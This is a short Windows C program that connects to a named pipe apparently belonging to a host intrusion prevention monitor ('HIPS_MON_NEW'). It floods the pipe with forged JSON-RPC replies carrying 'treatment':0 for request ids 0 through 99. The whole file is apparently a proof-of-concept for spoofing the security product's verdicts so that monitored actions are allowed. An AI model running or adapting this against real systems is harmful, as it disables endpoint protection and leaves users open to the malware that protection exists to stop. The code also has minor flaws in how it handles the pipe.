#include <windows.h>
#include <stdio.h>

int main() {
	HANDLE hFile = CreateFile("\\\\.\\Global\\Pipe\\HIPS_MON_NEW", GENERIC_READ | GENERIC_WRITE,
		0, NULL, OPEN_EXISTING, FILE_FLAG_OVERLAPPED, NULL);
	
	if (hFile != INVALID_HANDLE_VALUE) {
		int id;
		char buf[10];
		char msg[100];
		
		// Assume the range of id is 0..99
		for (id = 0; id < 100; id++) {
			itoa(id, buf, 10);
			strcpy(msg, "{\"result\":{\"treatment\":0},\"jsonrpc\":\"2.0\",\"id\":");
			strcat(msg, buf);
			strcat(msg, "}");
			printf("%s\n", msg);
			WriteFile(hFile, (LPCVOID)msg, strlen(msg) + 1, NULL, NULL);
		}
	}
	
	CloseHandle(hFile);
	
	return 0;
}
